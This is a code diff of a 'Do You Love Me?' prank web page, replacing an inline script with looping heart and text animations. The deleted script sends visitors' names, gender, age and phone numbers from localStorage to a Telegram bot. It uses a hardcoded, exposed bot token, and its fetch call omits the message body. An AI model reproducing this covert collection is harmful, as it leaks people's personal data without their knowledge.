@@ -47,7 +47,7 @@
   <body>
     <div class="container">
       <div class="header">
-        <img
+        <img class="img"
           src="https://cdn.pixabay.com/photo/2022/01/07/20/45/love-6922640_1280.png"
           alt="Love Icon"
         />
@@ -57,59 +57,38 @@
       </div>
     </div>
     <footer>
-      <p>&copy; 2023 Do You Love Me? All rights reserved.</p>
-      <a href="privacy.html">Privacy Policy</a> |
-      <a href="terms.html">Terms & Conditions</a>
+      <p class="footer-text">
+        &copy; <span id="year"></span> Do You Love Me? All rights reserved.
+        <br />
+      </p>
+      <a href="404.html">Privacy Policy</a> |
+      <a href="404.html">Terms & Conditions</a>
     </footer>
-    <script>
-      // Retrieve user data from localStorage
-      const userData = JSON.parse(localStorage.getItem("userData"));
-
-      if (userData) {
-        // Display personalized message
-        const messageElement = document.getElementById("message");
-        if (messageElement) {
-          messageElement.textContent = `I love you too, ${userData.username} (${userData.age} years old)!`;
-        } else {
-          console.error("Message element not found!");
-        }
-
-        // Prefix the phone number with +855
-        const formattedPhone = "+855" + userData.phone;
-
-        // Send data to Telegram bot
-        const telegramBotToken =
-          "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
-        const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
-        const message = `Informations:\nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
-
-        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-        })
-          .then((response) => {
-            if (!response.ok) {
-              return response.json().then((errorData) => {
-                throw new Error(`Telegram API error: ${errorData.description}`);
-              });
-            }
-            console.log("Message sent successfully to Telegram bot.");
-          })
-          .catch((error) => {
-            console.error("Error sending message to Telegram bot:", error);
-          });
-      } else {
-        // Handle case where no user data is found
-        const messageElement = document.getElementById("message");
-        if (messageElement) {
-          messageElement.textContent =
-            "No user data found. Please go back and fill out the form.";
-        } else {
-          console.error("Message element not found!");
-        }
-      }
-    </script>
   </body>
 </html>
+<!-- show this year -->
+<script>
+  document.getElementById("year").textContent = new Date().getFullYear();
+  document.getElementById("message").textContent = "I love you too! ❤️";
+  //add function image to the heart icon display animation ROTATE(360deg) and scale(1.5) rotate(0deg) and scale(1) auto not user click use loop run ruto not break
+  const heartIcon = document.querySelector(".img");
+  heartIcon.style.transition = "transform 0.5s ease-in-out";
+  heartIcon.style.transform = "rotate(0deg) scale(1)";
+  setInterval(() => {
+    heartIcon.style.transform = "rotate(360deg) scale(0.5)";
+    setTimeout(() => {
+      heartIcon.style.transform = "rotate(0deg) scale(1.2)";
+    }, 500);
+  }, 2050);
+  // add text animation to the message text display animation run left to right and right to left auto not user click use loop run ruto not break
+  const message = document.getElementById("message");
+  message.style.transition = "transform 0.5s ease-in-out";
+  message.style.transform = "translateX(0)";
+  setInterval(() => {
+    message.style.transform = "translateX(-10%)";
+    setTimeout(() => {
+      message.style.transform = "translateX(10%)";
+    }, 500);
+  }, 2050);
+  
+</script>
